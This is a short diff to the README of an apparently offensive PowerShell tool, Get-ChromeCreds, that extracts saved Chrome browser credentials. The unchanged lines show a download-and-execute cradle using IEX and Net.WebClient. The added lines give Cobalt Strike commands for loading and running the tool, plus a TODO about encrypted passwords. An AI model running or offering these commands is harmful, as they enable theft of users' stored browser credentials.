@@ -12,3 +12,12 @@ Run locally:
 
 Download and run:
 `IEX (New-Object Net.WebClient).DownloadString('Path\To\Get-ChromeCreds2.ps1')`
+
+Cobalt Strike:
+
+`powershell-import`
+
+`powerpick Get-ChromeCreds`
+
+## TODO:
+  - Does not read encrypted password data correctly
